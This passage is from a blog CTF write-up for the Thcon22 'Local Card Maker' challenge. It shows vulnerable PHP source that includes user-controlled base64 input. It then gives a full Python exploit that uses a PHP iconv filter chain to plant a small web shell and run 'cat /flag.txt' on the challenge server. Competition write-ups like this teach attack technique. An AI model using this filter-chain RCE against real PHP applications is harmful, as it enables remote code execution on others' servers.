<span class=giallo-l><span style=color:#f97583>	&lt;</span><span style=color:#79b8ff>link rel</span><span style=color:#f97583>=</span><span style=color:#9ecbff>"stylesheet"</span><span style=color:#79b8ff> href</span><span style=color:#f97583>=</span><span style=color:#9ecbff>"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css"</span><span style=color:#f97583>></span></span>
<span class=giallo-l><span style=color:#f97583>	&lt;</span><span style=color:#79b8ff>link rel</span><span style=color:#f97583>=</span><span style=color:#9ecbff>"stylesheet"</span><span style=color:#79b8ff> type</span><span style=color:#f97583>=</span><span style=color:#9ecbff>"text/css"</span><span style=color:#79b8ff> href</span><span style=color:#f97583>=</span><span style=color:#9ecbff>"css/style.css"</span><span style=color:#f97583>></span></span>
<span class=giallo-l><span style=color:#f97583>	&lt;</span><span style=color:#79b8ff>meta charset</span><span style=color:#f97583>=</span><span style=color:#9ecbff>"utf-8"</span><span style=color:#f97583>></span></span>
<span class=giallo-l><span style=color:#f97583>	&lt;</span><span style=color:#79b8ff>meta name</span><span style=color:#f97583>=</span><span style=color:#9ecbff>"viewport"</span><span style=color:#79b8ff> content</span><span style=color:#f97583>=</span><span style=color:#9ecbff>"width=device-width, initial-scale=1"</span><span style=color:#f97583>></span></span>
<span class=giallo-l><span style=color:#f97583>	&lt;</span><span style=color:#79b8ff>title</span><span style=color:#f97583>></span><span style=color:#79b8ff>Framework</span><span style=color:#f97583>&lt;/</span><span style=color:#79b8ff>title</span><span style=color:#f97583>></span></span>
<span class=giallo-l><span style=color:#f97583>&lt;/</span><span style=color:#79b8ff>head</span><span style=color:#f97583>></span></span>
<span class=giallo-l><span style=color:#f97583>&lt;</span><span style=color:#79b8ff>body</span><span style=color:#f97583>></span></span>
<span class=giallo-l><span style=color:#f97583>	&lt;</span><span style=color:#79b8ff>div</span><span style=color:#f97583> class=</span><span style=color:#9ecbff>"headers"</span><span style=color:#f97583>></span></span>
<span class=giallo-l><span style=color:#f97583>		&lt;</span><span style=color:#79b8ff>div</span><span style=color:#f97583> class=</span><span style=color:#9ecbff>"inner_headers"</span><span style=color:#f97583>></span></span>
<span class=giallo-l><span style=color:#f97583>			&lt;</span><span style=color:#79b8ff>div</span><span style=color:#f97583> class=</span><span style=color:#9ecbff>"logo_c"</span><span style=color:#f97583>></span></span>
<span class=giallo-l><span style=color:#f97583>				&lt;</span><span style=color:#79b8ff>h1</span><span style=color:#f97583>></span><span style=color:#79b8ff>Thcon22</span><span style=color:#f97583>&lt;</span><span style=color:#79b8ff>span</span><span style=color:#f97583>></span><span style=color:#79b8ff>Framework</span><span style=color:#f97583>&lt;/</span><span style=color:#79b8ff>span</span><span style=color:#f97583>>&lt;/</span><span style=color:#79b8ff>h1</span><span style=color:#f97583>></span></span>
<span class=giallo-l><span style=color:#f97583>			&lt;/</span><span style=color:#79b8ff>div</span><span style=color:#f97583>></span></span>
<span class=giallo-l><span style=color:#f97583>				&lt;</span><span style=color:#79b8ff>ul</span><span style=color:#f97583> class=</span><span style=color:#9ecbff>"nav"</span><span style=color:#f97583>></span></span>
<span class=giallo-l><span style=color:#f97583>	&lt;?</span><span style=color:#79b8ff>php</span></span>
<span class=giallo-l><span style=color:#b392f0>	createHeaders</span><span>(</span><span style=color:#79b8ff>array</span><span>(</span><span style=color:#9ecbff>'change_profile'</span><span style=color:#f97583> =></span><span style=color:#9ecbff> 'Edit'</span><span>,</span><span style=color:#9ecbff> 'view_profile'</span><span style=color:#f97583> =></span><span style=color:#9ecbff> 'View'</span><span>), $safe_handler);</span></span>
<span class=giallo-l><span style=color:#f97583>	?></span></span>
<span class=giallo-l><span style=color:#f97583>			&lt;/</span><span style=color:#79b8ff>ul</span><span style=color:#f97583>></span></span>
<span class=giallo-l><span style=color:#f97583>		&lt;/</span><span style=color:#79b8ff>div</span><span style=color:#f97583>></span></span>
<span class=giallo-l><span style=color:#f97583>	&lt;/</span><span style=color:#79b8ff>div</span><span style=color:#f97583>></span></span>
<span class=giallo-l><span style=color:#f97583>	&lt;</span><span style=color:#79b8ff>div</span><span style=color:#f97583> class=</span><span style=color:#9ecbff>"blank_space"</span><span style=color:#f97583>>&lt;/</span><span style=color:#79b8ff>div</span><span style=color:#f97583>></span></span>
<span class=giallo-l></span>
<span class=giallo-l><span style=color:#f97583>	&lt;?</span><span style=color:#79b8ff>php</span></span>
<span class=giallo-l><span style=color:#f97583>	if</span><span>(</span><span style=color:#79b8ff>isset</span><span>($_GET[</span><span style=color:#9ecbff>'page'</span><span>])</span><span style=color:#f97583> && !</span><span style=color:#79b8ff>empty</span><span>($_GET[</span><span style=color:#9ecbff>'page'</span><span>])</span><span style=color:#f97583> &&</span><span style=color:#79b8ff> isset</span><span>($_GET[</span><span style=color:#9ecbff>'pHash'</span><span>])</span><span style=color:#f97583> && !</span><span style=color:#79b8ff>empty</span><span>($_GET[</span><span style=color:#9ecbff>'pHash'</span><span>]))</span></span>
<span class=giallo-l><span>	{</span></span>
<span class=giallo-l><span>		$page</span><span style=color:#f97583> =</span><span> $_GET[</span><span style=color:#9ecbff>'page'</span><span>];</span></span>
<span class=giallo-l><span>		$hash</span><span style=color:#f97583> =</span><span> $_GET[</span><span style=color:#9ecbff>'pHash'</span><span>];</span></span>
<span class=giallo-l><span style=color:#f97583>		if</span><span>($safe_handler</span><span style=color:#f97583>-></span><span style=color:#b392f0>handle</span><span>($page, $hash))</span></span>
<span class=giallo-l><span>		{</span></span>
<span class=giallo-l><span style=color:#f97583>			include</span><span>(</span><span style=color:#79b8ff>base64_decode</span><span>($page)</span><span style=color:#f97583> .</span><span style=color:#9ecbff> '.php'</span><span>);</span></span>
<span class=giallo-l><span>		}</span></span>
<span class=giallo-l><span style=color:#f97583>		else</span></span>
<span class=giallo-l><span>		{</span></span>
<span class=giallo-l><span style=color:#79b8ff>			echo</span><span style=color:#9ecbff> "&lt;h2>Integrity verification failed...&lt;/h2>"</span><span>;</span></span>
<span class=giallo-l><span>		}</span></span>
<span class=giallo-l><span>	}</span></span>
<span class=giallo-l><span style=color:#f97583>	else</span><span>{</span></span>
<span class=giallo-l><span style=color:#f97583>	?></span></span>
<span class=giallo-l><span style=color:#f97583>	&lt;</span><span style=color:#79b8ff>h1</span><span style=color:#f97583>></span><span style=color:#79b8ff>Welcome to the profile editor</span><span style=color:#f97583> !&lt;/</span><span style=color:#79b8ff>h1</span><span style=color:#f97583>></span></span>
<span class=giallo-l><span style=color:#f97583>	&lt;</span><span style=color:#79b8ff>p</span><span style=color:#f97583>></span><span style=color:#79b8ff>Here you can create</span><span style=color:#f97583> and</span><span style=color:#79b8ff> edit your profile</span><span style=color:#f97583>.&lt;</span><span style=color:#79b8ff>br</span><span style=color:#f97583>></span><span style=color:#79b8ff> A card will be created</span><span style=color:#f97583> for</span><span style=color:#79b8ff> your Thcon22 participation</span><span style=color:#f97583>.&lt;</span><span style=color:#79b8ff>br</span><span style=color:#f97583>></span><span style=color:#79b8ff> We hope you will like the rendering</span><span style=color:#f97583> !&lt;/</span><span style=color:#79b8ff>p</span><span style=color:#f97583>></span></span>
<span class=giallo-l><span style=color:#f97583>	&lt;?</span><span style=color:#79b8ff>php</span></span>
<span class=giallo-l><span>	}</span></span>
<span class=giallo-l><span style=color:#f97583>	?></span></span>
<span class=giallo-l><span style=color:#f97583>&lt;/</span><span style=color:#79b8ff>body</span><span style=color:#f97583>></span></span>
<span class=giallo-l><span style=color:#f97583>&lt;/</span><span style=color:#79b8ff>html</span><span style=color:#f97583>></span></span></code></pre><p>Now we know for certain how files are loaded - <code>include(base64_decode($page) . '.php')</code>. We need to find a way to load <code>/flag.txt</code> even though <code>.php</code> is always appended.<h2 id=getting-the-flag>Getting the Flag</h2><p>When I participated in hxp CTF 2021 we faced <a rel="noopener external" href=https://lewin.co.il/winning-the-impossible-race-an-unintended-solution-for-includers-revenge-counter-hxp-2021/ target=_blank>a similar problem</a>, and I remember <a rel="noopener external" href=https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d target=_blank><code>loknop</code> developed a creative solution</a> using only <a rel="noopener external" href=https://www.php.net/manual/en/filters.convert.php target=_blank>PHP conversion filters</a> passed to <code>include()</code> to achieve <strong>RCE</strong> (which is much more than what we need here - reading file content, but will work!). I wrote the below solution to adapt the method to this challenge:<pre class=giallo style=color:#e1e4e8;background-color:#24292e><code data-lang=python><span class=giallo-l><span style=color:#f97583>import</span><span> base64</span></span>
<span class=giallo-l><span style=color:#f97583>import</span><span> hashlib</span></span>
<span class=giallo-l><span style=color:#f97583>import</span><span> requests</span></span>
<span class=giallo-l></span>
<span class=giallo-l><span style=color:#6a737d># Based on https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d (until line 52):</span></span>
<span class=giallo-l><span>conversions</span><span style=color:#f97583> =</span><span> {</span></span>
<span class=giallo-l><span style=color:#9ecbff>    'R'</span><span>:</span><span style=color:#9ecbff> 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2'</span><span>,</span></span>
<span class=giallo-l><span style=color:#9ecbff>    'B'</span><span>:</span><span style=color:#9ecbff> 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2'</span><span>,</span></span>
<span class=giallo-l><span style=color:#9ecbff>    'C'</span><span>:</span><span style=color:#9ecbff> 'convert.iconv.UTF8.CSISO2022KR'</span><span>,</span></span>
<span class=giallo-l><span style=color:#9ecbff>    '8'</span><span>:</span><span style=color:#9ecbff> 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2'</span><span>,</span></span>
<span class=giallo-l><span style=color:#9ecbff>    '9'</span><span>:</span><span style=color:#9ecbff> 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB'</span><span>,</span></span>
<span class=giallo-l><span style=color:#9ecbff>    'f'</span><span>:</span><span style=color:#9ecbff> 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213'</span><span>,</span></span>
<span class=giallo-l><span style=color:#9ecbff>    's'</span><span>:</span><span style=color:#9ecbff> 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61'</span><span>,</span></span>
<span class=giallo-l><span style=color:#9ecbff>    'z'</span><span>:</span><span style=color:#9ecbff> 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS'</span><span>,</span></span>
<span class=giallo-l><span style=color:#9ecbff>    'U'</span><span>:</span><span style=color:#9ecbff> 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932'</span><span>,</span></span>
<span class=giallo-l><span style=color:#9ecbff>    'P'</span><span>:</span><span style=color:#9ecbff> 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213'</span><span>,</span></span>
<span class=giallo-l><span style=color:#9ecbff>    'V'</span><span>:</span><span style=color:#9ecbff> 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5'</span><span>,</span></span>
<span class=giallo-l><span style=color:#9ecbff>    '0'</span><span>:</span><span style=color:#9ecbff> 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2'</span><span>,</span></span>
<span class=giallo-l><span style=color:#9ecbff>    'Y'</span><span>:</span><span style=color:#9ecbff> 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2'</span><span>,</span></span>
<span class=giallo-l><span style=color:#9ecbff>    'W'</span><span>:</span><span style=color:#9ecbff> 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2'</span><span>,</span></span>
<span class=giallo-l><span style=color:#9ecbff>    'd'</span><span>:</span><span style=color:#9ecbff> 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2'</span><span>,</span></span>
<span class=giallo-l><span style=color:#9ecbff>    'D'</span><span>:</span><span style=color:#9ecbff> 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2'</span><span>,</span></span>
<span class=giallo-l><span style=color:#9ecbff>    '7'</span><span>:</span><span style=color:#9ecbff> 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2'</span><span>,</span></span>
<span class=giallo-l><span style=color:#9ecbff>    '4'</span><span>:</span><span style=color:#9ecbff> 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2'</span></span>
<span class=giallo-l><span>}</span></span>
<span class=giallo-l></span>
<span class=giallo-l><span style=color:#6a737d># Simple but does the trick</span></span>
<span class=giallo-l><span>command</span><span style=color:#f97583> =</span><span style=color:#9ecbff> "cat /flag.txt"</span></span>
<span class=giallo-l></span>
<span class=giallo-l><span style=color:#6a737d>#&lt;?=`$_GET[0]`;;?></span></span>
<span class=giallo-l><span>base64_payload</span><span style=color:#f97583> =</span><span style=color:#9ecbff> "PD89YCRfR0VUWzBdYDs7Pz4"</span></span>
<span class=giallo-l></span>
<span class=giallo-l><span style=color:#6a737d># generate some garbage base64</span></span>
<span class=giallo-l><span>filters</span><span style=color:#f97583> =</span><span style=color:#9ecbff> "convert.iconv.UTF8.CSISO2022KR|"</span></span>
<span class=giallo-l><span>filters</span><span style=color:#f97583> +=</span><span style=color:#9ecbff> "convert.base64-encode|"</span></span>
<span class=giallo-l><span style=color:#6a737d># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span>
<span class=giallo-l><span>filters</span><span style=color:#f97583> +=</span><span style=color:#9ecbff> "convert.iconv.UTF8.UTF7|"</span></span>
<span class=giallo-l></span>
<span class=giallo-l><span style=color:#f97583>for</span><span> c</span><span style=color:#f97583> in</span><span> base64_payload[::</span><span style=color:#f97583>-</span><span style=color:#79b8ff>1</span><span>]:</span></span>
<span class=giallo-l><span>        filters</span><span style=color:#f97583> +=</span><span> conversions[c]</span><span style=color:#f97583> +</span><span style=color:#9ecbff> "|"</span></span>
<span class=giallo-l><span style=color:#6a737d>        # decode and reencode to get rid of everything that isn't valid base64</span></span>
<span class=giallo-l><span>        filters</span><span style=color:#f97583> +=</span><span style=color:#9ecbff> "convert.base64-decode|"</span></span>
<span class=giallo-l><span>        filters</span><span style=color:#f97583> +=</span><span style=color:#9ecbff> "convert.base64-encode|"</span></span>
<span class=giallo-l><span style=color:#6a737d>        # get rid of equal signs</span></span>
<span class=giallo-l><span>        filters</span><span style=color:#f97583> +=</span><span style=color:#9ecbff> "convert.iconv.UTF8.UTF7|"</span></span>
<span class=giallo-l></span>
<span class=giallo-l><span>filters</span><span style=color:#f97583> +=</span><span style=color:#9ecbff> "convert.base64-decode"</span></span>
<span class=giallo-l><span>file_to_use</span><span style=color:#f97583> =</span><span style=color:#9ecbff> "index"</span></span>
<span class=giallo-l></span>
<span class=giallo-l><span>final_payload</span><span style=color:#f97583> = f</span><span style=color:#9ecbff>"php://filter/</span><span style=color:#79b8ff>{</span><span>filters</span><span style=color:#79b8ff>}</span><span style=color:#9ecbff>/resource=</span><span style=color:#79b8ff>{</span><span>file_to_use</span><span style=color:#79b8ff>}</span><span style=color:#9ecbff>"</span><span>.encode()</span></span>
<span class=giallo-l></span>
<span class=giallo-l><span style=color:#6a737d># "Local Card Maker"-specific implementation starts here:</span></span>
<span class=giallo-l></span>
<span class=giallo-l><span>key_salt</span><span style=color:#f97583> = b</span><span style=color:#9ecbff>"Thcon_SuP3r_S3cr4t_K3y!"</span></span>
<span class=giallo-l><span>buf</span><span style=color:#f97583> =</span><span> base64.encodebytes(final_payload).replace(</span><span style=color:#f97583>b</span><span style=color:#9ecbff>"</span><span style=color:#79b8ff>\n</span><span style=color:#9ecbff>"</span><span>,</span><span style=color:#f97583> b</span><span style=color:#9ecbff>""</span><span>)</span></span>
<span class=giallo-l><span>buf_hash</span><span style=color:#f97583> =</span><span> (hashlib.sha1(key_salt</span><span style=color:#f97583> +</span><span> buf).hexdigest())</span></span>
<span class=giallo-l><span>buf</span><span style=color:#f97583> =</span><span> buf.decode()</span></span>
<span class=giallo-l></span>
<span class=giallo-l><span style=color:#79b8ff>print</span><span>(requests.get(</span><span style=color:#9ecbff>"http://challenges1.thcon.party:2001/index.php?page=</span><span style=color:#79b8ff>%s</span><span style=color:#9ecbff>&pHash=</span><span style=color:#79b8ff>%s</span><span style=color:#9ecbff>&0=</span><span style=color:#79b8ff>%s</span><span style=color:#9ecbff>"</span><span style=color:#f97583> %</span><span> (buf, buf_hash, command)).content)</span></span></code></pre><p>The result contained the flag <code>Thcon22{_Php_&nd_Ap@che_R000ck5$$_}</code> - I guess the original solution should have used Apache? 😅</div><div class=post-tags><a class=tag href=/tags/ctf>#ctf</a><a class=tag href=/tags/exploit>#exploit</a><a class=tag href=/tags/lfi>#lfi</a><a class=tag href=/tags/php>#php</a><a class=tag href=/tags/rce>#rce</a><a class=tag href=/tags/sha-1>#sha-1</a><a class=tag href=/tags/web>#web</a></div><div class=post-nav><a class=previous href=https://guylewin.com/blog/2025-01-01-spotify-smart-playlists/><svg class=icon><use href=https://guylewin.com/icons.svg#chevronLeft></use></svg> Next Project</a><a class=next href=https://guylewin.com/blog/2022-03-02-bathroom-smart-speaker-part-2-airplay-to-bluetooth-speaker-via-raspberry-pi/>Previous Project <svg class=icon><use href=https://guylewin.com/icons.svg#chevronRight></use></svg></a></div></article></main><footer><hr><div id=footer-container><p>Made using <a rel="noopener noreferrer" href=https://github.com/Speyll/anemone target=_blank>anemone</a> Zola theme</div></footer><script defer src=https://guylewin.com/js/script.js></script>